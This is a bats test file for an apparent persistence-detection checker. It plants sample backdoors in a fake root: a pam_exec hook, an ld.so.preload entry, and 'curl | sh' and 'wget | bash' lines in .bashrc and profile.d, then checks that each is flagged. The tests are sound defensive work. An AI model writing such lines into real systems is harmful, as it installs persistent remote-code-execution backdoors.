#!/usr/bin/env bats
load ../helpers
setup() { src; reset_state; make_root; _PM=none; }

@test "flags pam_exec in a pam.d file" {
  echo 'auth optional pam_exec.so /opt/x.sh' > "$ROOT/etc/pam.d/sshd"
  check_persistence
  emitted attention "pam_exec"
}

@test "flags ld.so.preload presence" {
  echo '/opt/evil.so' > "$ROOT/etc/ld.so.preload"
  check_persistence
  emitted attention "ld.so.preload"
}

@test "flags a curl|sh line in a shell rc file" {
  mkdir -p "$ROOT/home/alice"
  echo 'curl http://x/y | sh' > "$ROOT/home/alice/.bashrc"
  check_persistence
  emitted attention ".bashrc"
}

@test "flags an executable script dropped in profile.d" {
  echo 'wget -qO- http://x | bash' > "$ROOT/etc/profile.d/zz.sh"
  check_persistence
  emitted attention "profile.d"
}
